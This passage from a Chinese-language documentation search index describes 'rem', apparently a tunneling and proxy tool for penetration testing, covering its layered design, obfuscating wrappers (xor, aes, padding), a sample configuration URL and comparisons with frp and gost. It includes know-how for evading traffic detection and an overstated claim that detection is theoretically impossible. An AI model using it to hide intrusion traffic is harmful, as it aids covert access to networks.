\u662f\u4e00\u79cd\u9519\u8bef\u63a7\u5236\u673a\u5236\uff0c\u7528\u4e8e\u786e\u4fdd\u6570\u636e\u5728\u4e0d\u53ef\u9760\u7684\u4f20\u8f93\u5a92\u4ecb\u4e0a\u53ef\u9760\u4f20\u8f93\u3002\u5f53\u63a5\u6536\u65b9\u68c0\u6d4b\u5230\u6570\u636e\u5305\u9519\u8bef\u65f6\uff0c\u4f1a\u8bf7\u6c42\u53d1\u9001\u65b9\u91cd\u65b0\u53d1\u9001\u6570\u636e\u5305\u3002</p> <p>\u5728 rem \u4e2d\uff0c \u5bf9\u4e8e\u4e0d\u53ef\u9760\u94fe\u63a5\uff0c \u4f1a\u4f7f\u7528\u57fa\u4e8e kcp \u4fee\u6539\u7684 ARQ \u534f\u8bae\u4f7f\u5176\u53d8\u5f97\u76f8\u5bf9\u53ef\u9760\u3002</p>"},{"location":"rem/concept/#url-\u534f\u8bae","title":"URL \u534f\u8bae","text":"<p>rem \u4e2d\u7684\u4e00\u5207\u914d\u7f6e\u90fd\u57fa\u4e8e URL \u534f\u8bae\u3002\u5728\u65e9\u671f\u7248\u672c\uff0c rem \u9700\u8981\u901a\u8fc7\u63a5\u8fd1 20 \u4e2a\u53c2\u6570\u5206\u522b\u63cf\u8ff0\u4f20\u8f93\u5c42\uff0c\u4f1a\u8bdd\u5c42\uff0c \u8868\u793a\u5c42\uff0c \u5e94\u7528\u5c42\u914d\u7f6e\u7684\u5404\u79cd\u7ec6\u8282\u3002 \u73b0\u5728\u5c06\u8fd9\u4e9b\u914d\u7f6e\u4f7f\u7528 URL \u534f\u8bae\u8868\u793a\u3002</p> <p>\u5728 v0.1.0 \u4e4b\u540e\u6240\u6709\u7684\u914d\u7f6e\u9879\u90fd\u4f7f\u7528 url \u534f\u8bae\u8868\u793a\u3002</p> <p>\u4f8b\u5982 console \u7684\u914d\u7f6e\u793a\u4f8b\uff1a</p> <pre><code>tcp://nonenonenonenone:@127.0.0.1:34996?wrapper=lsJyUl5w5TTyTEH2wrMYkwfaNgNop3ry3pyRSKIpCriE8%2F%2FpkMfIgULLEAxv2LEoivHy2r61PIlZVYyirPVeG3bmND1hReHMFQGXwgL6Ui3JSgTKNZ3g%2BBc55AcCtf%2FRmtHZsvfyF5h0%2BEzYLqDeAvzqLmFhL1Ed0qKjpurSwC97oD3G8auhAxFp7AHqs29W19liQ25olc444pH8xZxEyS%2BMAzk%2FdqU5BcYgWHir5A5jL63DtBVmfGE0wRHvZuv7\n</code></pre>"},{"location":"rem/concept/#\u57fa\u672c\u6982\u5ff5","title":"\u57fa\u672c\u6982\u5ff5","text":"<p>\u5728 rem \u4e2d, \u57fa\u4e8e\u4f20\u8f93\u5c42\u4e4b\u4e0a\u91cd\u65b0\u62bd\u8c61\u4e86\u6574\u4e2a\u7f51\u7edc\u4ea4\u4e92\u7684\u6d41\u7a0b\u3002</p> <ul> <li>\u4f20\u8f93\u5c42, \u5bf9\u5e94 core/tunnel, \u5206\u4e3a listener \u548c dialer, \u53ef\u4ee5\u5b9e\u73b0\u81ea\u5b9a\u4e49\u7684\u4efb\u610f\u4f20\u8f93\u5c42\u4fe1\u9053\uff0c \u53ea\u9700\u8981\u5b9e\u73b0\u5bf9\u5e94\u7684 golang \u7684\u63a5\u53e3\u5373\u53ef\u3002\u76ee\u524d\u5b9e\u73b0\u4e86\uff0ctcp, udp, icmp, websocket.</li> <li>\u4f1a\u8bdd\u5c42, \u5b9e\u73b0\u4e86\u94fe\u63a5\u590d\u7528(mux)\uff0c\u4f1a\u8bdd\u7ba1\u7406.</li> <li>\u52a0\u5bc6\u6df7\u6dc6\u5c42(\u5bf9\u5e94\u8868\u793a\u5c42)\uff0c\u5bf9\u5e94 core/wrapper\uff0c\u5bf9\u5e94\u7684\u63a5\u53e3\u662f ReadWriteCloser, \u53ea\u9700\u8981\u5b9e\u73b0\u5bf9\u5e94\u7684 Read \u548c Writer \u63a5\u53e3\uff0c \u5373\u53ef\u5b9e\u73b0\u5bf9\u4f20\u8f93\u5c42\u6d41\u7a0b\u7684\u52a0\u5bc6\uff0c\u6df7\u6dc6\uff0c \u4f2a\u88c5\u3002\u751a\u81f3\u53ef\u4ee5\u5b9e\u73b0\u4e0a\u4e0b\u884c\u6d41\u91cf\u5206\u522b\u914d\u7f6e\u4e0d\u540c\u7684 wrapper. \u76ee\u524d\u5b9e\u73b0\u4e86 aes, xor, padding.</li> <li>\u4e2d\u8f6c/\u4ee3\u7406\u5c42(\u5bf9\u5e94\u8868\u793a\u5c42) (\u53ef\u9009), \u53ef\u4ee5\u901a\u8fc7\u7b2c\u4e09\u65b9\u4ee3\u7406/\u670d\u52a1\u4e2d\u8f6c\u6d41\u91cf\uff0c \u4f8b\u5982\u901a\u8fc7 ssh, socks5, neoreg, suo5 \u7b49\u4efb\u610f\u5177\u6709\u6d41\u91cf\u529f\u80fd\u7684\u5b9e\u73b0\u6570\u636e\u8f6c\u53d1, \u76ee\u524d\u5b9e\u73b0\u4e86 http/https, socks5/4, ssh, shadowsocks</li> <li>\u5e94\u7528\u5c42, \u57fa\u4e8e\u4e0a\u9762\u4e09\u5c42\u5b9e\u73b0\u7684\u4fe1\u9053, \u53ef\u4ee5\u88ab\u5c01\u88c5\u4e3a\u4e0d\u540c\u7684\u5e94\u7528, \u76ee\u524d\u5b9e\u73b0\u4e86 socks5, port forward, http \u4ee3\u7406, shadowsocks, trojan</li> </ul> <p>\u57fa\u4e8e\u8fd9\u6837\u7684\u62bd\u8c61\u5c42\u7ea7, \u6211\u4eec\u53ef\u4ee5\u4efb\u610f\u62d3\u5c55 rem \u7684\u80fd\u529b\u8fb9\u754c\u3002 \u6211\u4eec\u53ef\u4ee5\u5feb\u901f\u6dfb\u52a0\u4e00\u4e2a\u4f20\u8f93\u5c42\u534f\u8bae\uff0c \u6216\u662f\u52a0\u5bc6\u6df7\u6dc6\u7b97\u6cd5\uff0c \u6216\u662f\u4ee3\u7406\u4e2d\u8f6c\u5de5\u5177\uff0c \u53c8\u6216\u662f\u6700\u7ec8\u9762\u5411\u7528\u6237\u7684\u534f\u8bae\u3002</p> <p>\u8fd9\u662f\u524d\u6240\u672a\u6709\u7684\u6f5c\u529b\uff0c \u7406\u8bba\u4e0a\u4e0d\u5b58\u5728\u4efb\u4f55\u5728\u6d41\u91cf\u4e0a\u88ab\u68c0\u6d4b\u7684\u53ef\u80fd\u6027\u3002</p>"},{"location":"rem/concept/#tunnel","title":"tunnel","text":"<p>tunnel \u662f rem \u4e2d\u7684\u4e00\u79cd\u6982\u5ff5\uff0c \u8868\u793a\u4e00\u4e2a\u865a\u62df\u7684\u4f20\u8f93\u5c42\u3002</p> <p>\u53ef\u4ee5\u662f\u539f\u672c\u5c31\u53ef\u9760\u7684 tcp\uff0c\u4e5f\u53ef\u4ee5\u662f\u88ab udp over kcp \u8fd9\u6837\u7684\u4f20\u7edf\u610f\u4e49\u4e0a\u7684\u4f20\u8f93\u5c42\u3002</p> <p>\u4e5f\u53ef\u4ee5\u662f websocket+\u4e91\u51fd\u6570/CDN\uff0c \u6216\u8005 http+OSS \u8fd9\u6837\u7684\u88ab rem \u6a21\u62df\u51fa\u6765\u7684\u4f20\u8f93\u5c42\u3002</p> <p>rem \u57fa\u4e8e tunnel \u6784\u5efa\u4f20\u8f93\u5c42\uff0c \u5e76\u5728\u8fd9\u4e2a\u4f20\u8f93\u5c42\u4e0a\u6784\u5efa\u4e0a\u5c42\u5e94\u7528\u3002</p> <p>rem \u67b6\u6784\uff1a</p> <pre><code>graph TD\n    subgraph Application[\u5e94\u7528\u5c42 Application]\n        A1[inbound:&lt;br/&gt;socks5, http, trojan...]\n        A2[outbound:&lt;br/&gt;proxyclient]\n    end\n\n    subgraph Presentation[\u8868\u793a\u5c42 Presentation]\n        P1[wrapper:&lt;br/&gt;xor, aes, padding...]\n        P2[compress]\n    end\n\n    subgraph Session[\u4f1a\u8bdd\u5c42 Session]\n        S1[bridge]\n        S2[mux]\n    end\n\n    subgraph Transport[\u4f20\u8f93\u5c42 Transport]\n        T1[tunnel:&lt;br/&gt; http, tcp, udp, icmp, websocket, wireguard...]\n        T2[proxyclient:&lt;br/&gt; ssh, socks5, neoreg, suo5...]\n    end\n\n    Application --- Presentation\n    Presentation --- Session\n    Session --- Transport\n\n    classDef layer fill:#f9f9f9,stroke:#333,stroke-width:2px;\n    class Application,Presentation,Session,Transport layer;</code></pre>"},{"location":"rem/concept/#wrapper","title":"wrapper","text":"<p>wrapper \u7528\u6765\u5bf9\u6570\u636e\u7f16\u7801\u89e3\u7801\uff0c\u52a0\u5bc6\u89e3\u5bc6\uff0c \u6df7\u6dc6\u89e3\u6df7\u6dc6\u3002 \u4f4d\u4e8e OSI \u6a21\u578b\u4e2d\u7684\u8868\u793a\u5c42\u3002</p> <p>wrapper \u5728 tunnel \u5c42\u9762\u4f5c\u7528\uff0c\u4f8b\u5982\u5f53\u6211\u4eec\u4f7f\u7528 xor\uff0c \u5c06\u4f1a\u76f4\u63a5\u4f5c\u7528\u4e8e\u4f20\u8f93\u5c42\uff0c\u6574\u4e2a\u6570\u636e\u6d41\u90fd\u4f1a\u4f7f\u7528 xor\u3002</p>"},{"location":"rem/concept/#inboundoutbound","title":"inbound/outbound","text":"<p>inbound \u548c outbound \u8868\u793a rem \u4e2d\u7684\u6570\u636e\u6d41\u5411\u3002\u4f4d\u4e8e OSI \u6a21\u578b\u4e2d\u7684\u5e94\u7528\u5c42</p> <p>inbound \u8868\u793a\u7528\u6237\u4ea4\u4e92\u7aef\uff0c outbound \u8868\u793a\u5bf9\u5916\u8bf7\u6c42\u7aef\u3002</p> <p>inbound \u548c outbound \u90fd\u53ef\u4ee5\u5206\u522b\u914d\u7f6e\u4e0d\u540c\u7684\u534f\u8bae\u3002 \u4f8b\u5982\u5b9e\u73b0\u4e00\u4e2a\u53cd\u5411\u4ee3\u7406\uff0c \u5bf9\u7528\u6237\u66b4\u9732 socks5\u3002\u5c31\u53ef\u4ee5\u914d\u7f6e inbound \u4e3a socks5\uff0c outbound \u4e3a raw\u3002 \u5173\u4e8e socks5 \u7684\u534f\u8bae\u7684\u8ba4\u8bc1\uff0c \u534f\u8bae\u89e3\u6790\u4f1a\u5728 inbound \u4e2d\u5b9e\u73b0\uff0c outbound \u53ea\u5904\u7406\u5bf9\u5916\u8bf7\u6c42\uff0c \u5e76\u8f6c\u53d1\u6570\u636e\u3002</p> <p>\u795e\u5947\u7684\u5730\u65b9\u5728\u4e8e\u4e5f\u53ef\u4ee5\u7528\u53e6\u4e00\u79cd\u53cd\u5411\u4ee3\u7406\uff0c inbound \u914d\u7f6e raw\uff0c outbound \u914d\u7f6e socks5\u3002 \u8fd9\u6837\u6240\u6709\u7684\u6570\u636e\u5148\u4f20\u9012\u5230 outbound \u7aef\uff0c \u4f8b\u5982 socks5 \u7248\u672c\u4ea4\u6362\uff0cauth\u3002</p> <p>\u4ece\u8fd9\u91cc\u80fd\u53d1\u73b0\uff0c\u534f\u8bae\u4ea4\u4e92\u90e8\u5206\u5728 inbound \u5b9e\u73b0\u4f1a\u66f4\u52a0\u9ad8\u6548\uff0c\u53ef\u4ee5\u5c11\u4f20\u9012\u975e\u5e38\u591a\u7684\u5c0f\u6570\u636e\u5305\u3002</p> <p>\u5728 proxy \u6a21\u5f0f\u4e2d\uff0c inbound \u4f4d\u4e8e client\uff0c outbound \u4f4d\u4e8e server\u3002</p> <pre><code>graph LR\n    subgraph Client\n    Inbound\n    end\n    subgraph Server\n    Outbound\n    end\n    Inbound --&gt; Outbound</code></pre> <p>\u5728 reverse \u6a21\u5f0f\u4e2d\uff0c inbound \u4f4d\u4e8e server\uff0c outbound \u4f4d\u4e8e client\u3002</p> <pre><code>graph LR\n    subgraph Server\n    Inbound\n    end\n    subgraph Client\n    Outbound\n    end\n    Inbound --&gt; Outbound</code></pre>"},{"location":"rem/design/","title":"\u8bbe\u8ba1","text":""},{"location":"rem/design/#\u80cc\u666f","title":"\u80cc\u666f","text":"<p>\u6709\u4e00\u4e2a\u7b11\u8bdd\uff0c\"\u4e2d\u56fd\u4eba\u7684\u7f51\u7edc\u6c34\u5e73\u7279\u522b\u597d\". \u4e8b\u5b9e\u4e0a\u4e5f\u786e\u5b9e\u5982\u6b64, \u7edd\u5927\u90e8\u5206\u4ee3\u7406\u76f8\u5173\u7684\u5de5\u5177\u90fd\u548c\u4e2d\u56fd\u5f00\u53d1\u8005\u6709\u5173.</p> <ul> <li>frp \u6700\u5e38\u4f7f\u7528, \u6700\u7a33\u5b9a\u7684\u53cd\u5411\u4ee3\u7406\u5de5\u5177. \u914d\u7f6e\u76f8\u5bf9\u9ebb\u70e6, \u6709\u4e00\u4e9b\u5f3a\u7279\u5f81\u5df2\u88ab\u4e3b\u6d41\u9632\u62a4\u8bbe\u5907\u8bc6\u522b, \u7c7b\u4f3c\u7684\u8fd8\u6709nps, ngrok, rathole, spp. \u4e0d\u652f\u6301\u53cd\u5411\u7aef\u53e3\u8f6c\u53d1</li> <li>gost \u4e00\u6b3e\u5f3a\u5927\u7684\u6b63\u5411\u4ee3\u7406\u5de5\u5177, v2\u7248\u672c\u4e0d\u652f\u6301\u53cd\u5411\u4ee3\u7406, v3\u5f00\u59cb\u652f\u6301\u66f4\u591a\u79cd\u591a\u6837\u7684\u6d41\u91cf\u64cd\u4f5c\u65b9\u5f0f, \u672a\u6765\u53ef\u671f.</li> <li>iox \u8f7b\u91cf\u4f46\u7a33\u5b9a\u7684\u7aef\u53e3\u8f6c\u53d1\u5de5\u5177, \u4f46\u662f\u901a\u8baf\u4e0d\u52a0\u5bc6</li> <li>stowaway \u591a\u7ea7\u4ee3\u7406\u5de5\u5177, \u652f\u6301\u6b63\u53cd\u5411\u4ee3\u7406\uff0c \u4f46\u662f\u8fdb\u652f\u6301TCP/HTTP/WS\u534f\u8bae\u901a\u8baf. \u7c7b\u4f3c\u7684\u5de5\u5177\u8fd8\u6709lcx,termite,earthworm.</li> </ul>"},{"location":"rem/design/#\u8bbe\u8ba1","title":"\u8bbe\u8ba1","text":"<p>\u4ece\u5f00\u6e90\u4e16\u754c\u7684\u5de5\u5177\u5927\u81f4\u80fd\u603b\u7ed3\u51fa\u4e00\u6b3e\u80fd\u9002\u914d\u6240\u6709\u573a\u666f\u7684\u4ee3\u7406\u5de5\u5177\u5e94\u8be5\u5177\u5907\u7684\u80fd\u529b. </p> <ul> <li>\u7aef\u53e3\u8f6c\u53d1, \u5305\u62ec\u6b63\u5411\u7aef\u53e3\u8f6c\u53d1\u4e0e\u53cd\u5411\u7aef\u53e3\u8f6c\u53d1. \u6b63\u5411\u4ee3\u7406\u4e0e\u53cd\u5411\u4ee3\u7406\u4e5f\u662f\u57fa\u4e8e\u6b64\u5b9e\u73b0</li> <li>\u591a\u4ee3\u7406\u534f\u8bae\u652f\u6301, \u9700\u8981\u652f\u6301\u539f\u672c\u5c31\u5b58\u5728\u7684\u4ee3\u7406\u534f\u8bae\u4ee5\u4fdd\u8bc1\u4e0e\u5176\u4ed6\u534f\u8bae\u7684\u8054\u52a8</li> <li>\u591a\u4fe1\u9053\u652f\u6301, \u5c3d\u53ef\u80fd\u591a\u7684\u652f\u6301\u7f51\u7edc\u4e16\u754c\u4e2d\u5df2\u7ecf\u5b58\u5728\u7684\u4f20\u8f93\u5c42\u534f\u8bae</li> <li>\u7ea7\u8054, \u7ea7\u8054\u5b9e\u9645\u4e0a\u662f\u4ee3\u7406\u5de5\u5177\u7684\u81ea\u4e3e</li> <li>\u6d41\u91cf\u52a0\u5bc6\u4e0e\u6df7\u6dc6, \u8fd9\u662f\u4ee3\u7406\u5de5\u5177\u5b89\u5168\u6027\u7684\u4fdd\u8bc1</li> </ul> <p>\u5f53\u7136\u8fd9\u53ea\u662f\u57fa\u672c\u529f\u80fd, \u4e00\u4e2a\u5de5\u5177\u5b9e\u73b0\u4e86\u8fd9\u4e9b\u529f\u80fd, \u624d\u6709\u80fd\u53bb\u8ba8\u8bba\u4e0b\u4e00\u4ee3\u4ee3\u7406\u5de5\u5177\u5e94\u8be5\u662f\u4ec0\u4e48\u6837\u5b50\u7684.</p> <p>\u4e0b\u9762\u7684\u5185\u5bb9\u57fa\u4e8e\u5df2\u7ecf\u5b9e\u73b0\u4e86\u8fd9\u4e9b\u57fa\u672c\u529f\u80fd\uff0c\u8fdb\u4e00\u6b65\u63a2\u7d22\u7f51\u7edc\u4fa7\u7684\u5404\u5f0f\u5404\u6837\u7684\u73a9\u6cd5\u3002</p>"},{"location":"rem/design/#\u8bbe\u8ba1\u7406\u5ff5","title":"\u8bbe\u8ba1\u7406\u5ff5","text":"<p>\u5728\u80cc\u666f\u4e2d\u63d0\u5230\u8fc7\u7684\u5de5\u5177\u4e2d\uff0c\u6700\u63a5\u8fd1\u8bbe\u8ba1\u76ee\u6807\u7684\u662fgost_v3, \u6240\u4ee5\u6211\u4eec\u5148\u770b\u770b\u5b83\u7684\u67b6\u6784.</p> <p>\u5177\u4f53\u7684\u4ee3\u7801\u5206\u6790\u5982\u679c\u6709\u4eba\u613f\u610f\u770b, \u5c31\u5355\u72ec\u5199\u4e00\u7bc7\uff0c\u8fd9\u91cc\u53ea\u8bb2\u67b6\u6784</p> <p>\u4e00\u4e2aGOST\u670d\u52a1\u6216\u8282\u70b9\u88ab\u5206\u4e3a\u4e24\u5c42\uff0c\u6570\u636e\u901a\u9053\u5c42\u548c\u6570\u636e\u5904\u7406\u5c42. \u6570\u636e\u901a\u9053\u5c42\u5bf9\u5e94\u7684\u662f\u62e8\u53f7\u5668\u548c\u76d1\u542c\u5668\uff0c\u6570\u636e\u5904\u7406\u5c42\u5bf9\u5e94\u7684\u662f\u8fde\u63a5\u5668\uff0c\u5904\u7406\u5668\u548c\u8f6c\u53d1\u5668\uff0c\u8fd9\u91cc\u53c8\u6839\u636e\u662f\u5426\u4f7f\u7528\u8f6c\u53d1\u5668\u6765\u533a\u5206\u662f\u4ee3\u7406\u8fd8\u662f\u8f6c\u53d1\u3002</p> <p>\u8fd9\u4e2a\u67b6\u6784\u5bf9\u5e94\u7684\u662fgo\u7684net\u5305\u4e2d\u7684\u67b6\u6784, \u4e0ego\u672c\u8eab\u7684\u8bbe\u8ba1\u7406\u5ff5\u975e\u5e38\u5951\u5408. golang\u7684\u7f51\u7edc\u8bbe\u8ba1\u975e\u5e38\u7b26\u5408\u76f4\u89c9.</p>"},{"location":"rem/design/#golang\u7684net\u5305","title":"golang\u7684net\u5305","text":"<p>golang \u5305\u4e2d\u7684\u51e0\u4e2a\u91cd\u8981\u6982\u5ff5\u3002 Listener \u76d1\u542c\u5668</p> <pre><code>type Listener interface {\n    // Accept \u7b49\u5f85\u5e76\u8fd4\u56de\u4e0b\u4e00\u4e2a\u8fde\u63a5\u5230\u6b64\u76d1\u542c\u5668\u7684\u8fde\u63a5\u3002\n    Accept() (Conn, error)\n\n    // Close \u5173\u95ed\u76d1\u542c\u5668\u3002\u4efb\u4f55\u963b\u585e\u4e2d\u7684 Accept \u64cd\u4f5c\u90fd\u4f1a\u4e0d\u518d\u963b\u585e\u5e76\u8fd4\u56de\u9519\u8bef\u3002\n    Close() error\n\n    // Addr \u8fd4\u56de\u76d1\u542c\u5668\u7684\u7f51\u7edc\u5730\u5740\u3002\n    Addr() Addr\n}\n</code></pre> <p>Dialer \u62e8\u53f7\u5668</p> <pre><code>type Dialer interface {\n    Dial(network, address string) (net.Conn, error)\n}\n</code></pre> <p>Conn \u8fde\u63a5, Accept\u4e0eDial\u90fd\u5c06\u8fd4\u56deConn</p> <pre><code>type Conn interface {\n    // Read \u4ece\u8fde\u63a5\u4e2d\u8bfb\u53d6\u6570\u636e\u3002\n    Read(b []byte) (n int, err error)\n\n    // Write \u5411\u8fde\u63a5\u4e2d\u5199\u5165\u6570\u636e\u3002\n    Write(b []byte) (n int, err error)\n\n    // Close \u5173\u95ed\u8fde\u63a5\u3002\n    Close() error\n\n... Others\n}\n</code></pre> <p>golang \u5c06tcp/udp\u90fd\u6309\u7167\u8fd9\u6837\u7684\u62bd\u8c61\u8fdb\u884c\u5c01\u88c5, \u4e5f\u662f\u4f20\u8f93\u5c42\u7684\u6700\u5c0f\u62bd\u8c61\u3002 \u6362\u53e5\u8bdd\u8bf4\uff0c\u6211\u4eec\u53ea\u8981\u5b9e\u73b0\u4e86\u8fd9\u4e09\u4e2ainterface\uff0c \u5c31\u80fd\u8ba9\u4efb\u610f\u6570\u636e\u4f20\u8f93\u7684\u4fe1\u9053\u4f5c\u4e3a\u6211\u4eec\u7684\u4f20\u8f93\u5c42\uff08\u5f53\u7136\u73b0\u5b9e\u8981\u6bd4\u8fd9\u590d\u6742\u4e00\u70b9\uff0c\u540e\u9762\u4f1a\u63d0\u5230\uff09\u3002</p> <p>\u66f4\u91cd\u8981\u7684\u662f\u4e3a\u4ec0\u4e48rem\u4f7f\u7528golang\u6784\u5efa\uff0c\u8fd9\u4e5f\u4e0e\u8fd9\u4e2a\u8bbe\u8ba1\u6709\u5173\u3002 \u5982\u679c\u5bf9golang\u7684\u5404\u79cd\u7f51\u7edc\u5e93\u719f\u6089\u7684\u670b\u53cb\u5e94\u8be5\u77e5\u9053\uff0cnet.Conn\u8fd9\u4e2a\u63a5\u53e3\u6216\u8005\u5176\u7f29\u7565\u7248 io.ReadWriteCloser \u63a5\u53e3\u88ab\u5e7f\u6cdb\u7528\u4e8e\u5404\u79cd\u5404\u6837\u6709\u5173\u6570\u636e\u4f20\u8f93/\u52a0\u5bc6/\u7f51\u7edc/\u6d41\u5f0f\u4f20\u8f93\u7684\u573a\u666f\u3002</p> <p>\u4f8b\u5982http,tls,shadowsocks\u5e93\u4e2d\u90fd\u6709ServerConn\u51fd\u6570\uff0c \u7528\u4e8e\u4e3a\u5b9e\u73b0\u4e86net.Conn\u7ed3\u6784\u4f53\u7684\u7ed3\u6784\u5b9e\u73b0\u4e0a\u5c42\u5e94\u7528\uff0c \u5e76\u4e14ServerConn\u8fd4\u56de\u503c\u4e00\u822c\u8fd8\u662fnet.Conn, \u53ef\u4ee5\u88ab\u591a\u5c42\u5d4c\u5957\u3002</p> <p>\u5047\u8bbe\u6211\u4eec\u5c06\u4e00\u4e2a\u57fa\u4e8e\u67d0\u4e2a\u5916\u90e8api\u901a\u8baf(\u4f8b\u5982telegram)\u7684\u4fe1\u9053\u4f5c\u4e3a\u4f20\u8f93\u5c42\uff0c\u53ea\u9700\u5b9e\u73b0Dial\u548cListener\u5bf9\u5e94\u7684\u65b9\u6cd5\u5373\u53ef\u8ba9\u5176\u5305\u88c5\u4e0atls,shadowsocks\u7b49\u5404\u79cd\u52a0\u5bc6\u534f\u8bae\u3002</p>"},{"location":"rem/design/#gost\u7684\u8bbe\u8ba1","title":"gost\u7684\u8bbe\u8ba1","text":"<p>golang\u5c06tcp,udp,icmp\u7684\u5404\u79cd\u7528\u6cd5\u90fd\u5c01\u88c5\u6210\u4e86\u8fd9\u4e9b\u7528\u6cd5\u3002\u5982\u679c\u719f\u6089golang\u5404\u79cd\u7f51\u7edc\u76f8\u5173\u7684\u5e93\uff0c\u66f4\u662f\u4f1a\u53d1\u73b0\uff0c\u5404\u79cd\u590d\u6742\u7684\u534f\u8bae\u5b9e\u73b0\u51e0\u4e4e\u90fd\u6700\u7ec8\u5bf9\u5916\u66b4\u9732\u8fd9\u4e9binterface\u3002\u662f\u63a5\u53e3\u4e0e\u7ec4\u5408\u8fd9\u4e2a\u8bbe\u8ba1\u7406\u5ff5\u7684\u6559\u79d1\u4e66\u3002</p> <p>\u5728gost\u4e2d\uff0c\u5728\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u5e76\u6ca1\u6709server\u4e0eclient\u7684\u533a\u522b\uff0c\u8fd9\u662f\u4e2a\u975e\u5e38\u4f18\u96c5\u8bbe\u8ba1\uff0c\u610f\u5473\u7740server\u4e0eclient\u53ef\u4ee5\u968f\u65f6\u4e92\u76f8\u8f6c\u5316\u3002\u901a\u8fc7gost\u642d\u5efa\u7684\u4ee3\u7406\u53ef\u4ee5\u662f\u7f51\u72b6\u7684\uff0c\u800c\u4e0d\u53ea\u662f\u6811\u72b6\u7684\u3002\u8fd9\u662f\u8282\u70b9\u95f4\u4e92\u901a\u7684\u5fc5\u5907\u8bbe\u8ba1\u4e4b\u4e00\u3002</p> <p>gost\u7684server\u4e0eclient\u662f\u901a\u8fc7\u7ec4\u5408Listener\uff0cDialer\uff0cConn\uff0cProxy\u5b9e\u73b0\u7684\u3002\u542f\u7528Listener\u7684\u5c31\u662fserver\uff0c\u4f7f\u7528Dialer\u7684\u5c31\u662fclient\u3002\u4f46\u4e5f\u53ef\u4ee5\u65e2\u6253\u5f00Listener\uff0c\u4e5f\u4f7f\u7528Dialer\uff0c\u8fd9\u5373\u662f\u53c8\u662f\u7684\u5e94\u8be5\u53eb\u505aagent\u3002rem\u4e5f\u662f\u8fd9\u4e2a\u8bbe\u8ba1\uff0c\u5982\u679c\u4e0d\u8003\u8651\u903b\u8f91\u4e0a\u7684\u5212\u5206server\u4e0eclient\u65f6\uff0c\u6240\u6709\u7684rem\u90fd\u662f\u5e73\u7b49\u7684agent\uff0c\u6570\u636e\u53ef\u4ee5\u5728\u8fd9\u4e9bagent\u76f4\u63a5\u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u4ea4\u4e92\u3002\u5728gost\u4e2d\uff0c\u7ea7\u8054\u662f\u4e0d\u8a00\u81ea\u660e\u7684\uff0c\u4e0d\u9700\u8981\u7279\u610f\u5f3a\u8c03\u7684\u3002</p> <p>\u4ece\u8fd9\u4e2a\u89d2\u5ea6\u770b\u6765\uff0cgost\u662f\u4e2a\u975e\u5e38\u5b8c\u7f8e\u7684\u4ee3\u7406\u5de5\u5177\uff0c\u5b83\u652f\u6301\u975e\u5e38\u591a\u7684\u4f20\u8f93\u5c42\u534f\u8bae\uff0c\u4e5f\u652f\u6301\u5bf9\u6d41\u91cf\u4f20\u8f93\u7684\u4efb\u610f\u63c9\u6413\u3002gost\u6bd4frp\u81ea\u7531\u5f97\u591a\uff0c\u6bd4\u6709\u7740\u6bd4iox\u66f4\u52a0\u4e30\u5bcc\u4e0e\u5f3a\u5927\u7684\u7279\u6027\uff0c\u66f4\u662f\u80fd\u5b9e\u73b0stoyaway\u80fd\u5b9e\u73b0\u7684\u4e00\u5207\u529f\u80fd\u3002\u5e76\u4e14gost\u62e5\u6709\u4e00\u4e2a\u7565\u6709\u95e8\u69db\uff0c\u4f46\u6781\u5176\u4f18\u96c5\u7684\u547d\u4ee4\u884c\u8bbe\u8ba1\u3002 \u7f3a\u70b9\u5c31\u662f\uff0c\u5b83\u4e0d\u592a\u9002\u5408\u9ad8\u5f3a\u5ea6\u5bf9\u6297\u7684\u6e17\u900f\u73af\u5883\u3002gost\u548cfrp\u4e00\u6837\uff0c\u662f\u4e3a\u4e86\u89e3\u51b3\u7f51\u7edc\u95ee\u9898\u7684\uff0c\u4e0d\u662f\u4e3a\u4e86\u5bf9\u6297\u800c\u751f\u7684\u3002\u5b83\u4eec\u5185\u5d4c\u4e86web/grpc\uff0c\u6709\u4e00\u7cfb\u5217\u51c6\u5165\uff0c\u9650\u6d41\uff0c\u8ba4\u8bc1\uff0c\u53ef\u89c2\u5bdf\u6027\u529f\u80fd\uff0c\u5bfc\u81f4\u4e86\u5ba2\u6237\u7aef\u8f83\u4e3a\u81c3\u80bf\u3002\u6700\u5173\u952e\u7684\u662f\uff0c\u4ed6\u4eec\u5bf9\u6570\u636e\u52a0\u5bc6\u7684\u5b9e\u73b0\u53ea\u9650\u4e8etls/mtls, \u8fd9\u5728\u5f88\u591a\u60c5\u51b5\u4e0b\u53cd\u800c\u6210\u4e3a\u4e86\u7279\u5f81\u3002</p> <p>\u800crem\u9879\u76ee\u5f00\u59cb\u4e4b\u521d\u8fd8\u53ea\u6709gost v2\u548cfrp\u3002gost\u4e0d\u652f\u6301\u53cd\u5411\u4ee3\u7406\uff0cfrp\u4e0d\u652f\u6301\u6b63\u5411\u4ee3\u7406\u3002\u5230\u4e862024\u5e74\uff0cgost\u4e0efrp\u90fd\u8865\u5168\u81ea\u5df1\u529f\u80fd\u4e0a\u5f31\u70b9\uff0c\u57fa\u672c\u5b9e\u73b0\u4e86\u5bf9\u6d41\u91cf\u8d70\u5411\u7684\u81ea\u7531\u7ec4\u5408\u3002\u90a3rem\u53ea\u9700\u8981\u5728\u7ee7\u627f\u4ed6\u4eec\u4f18\u70b9\u7684\u540c\u65f6\u5b9e\u73b0\u5bf9\u6d41\u91cf\u672c\u8eab\u7684\u4efb\u610f\u63c9\u6413\u3002</p> <p>gost\u4f5c\u4e3a\u4e00\u4e2a\u4ee3\u7406\u5de5\u5177\uff0c \u5df2\u7ecf\u80fd\u8986\u76d6\u7edd\u5927\u90e8\u5206\u9700\u6c42\u3002 \u4f46\u5bf9\u4e8e\u653b\u9632\u573a\u666f\u6765\u8bf4, \u8fd8\u662f\u6709\u4e0d\u5c11\u7279\u6b8a\u7684\u9700\u6c42</p>"},{"location":"rem/design/#rem\u7684\u8bbe\u8ba1","title":"rem\u7684\u8bbe\u8ba1","text":"<p>\u800crem\u7684\u62bd\u8c61\u4f1a\u66f4\u52a0\u5f7b\u5e95\u4e00\u4e9b\u3002 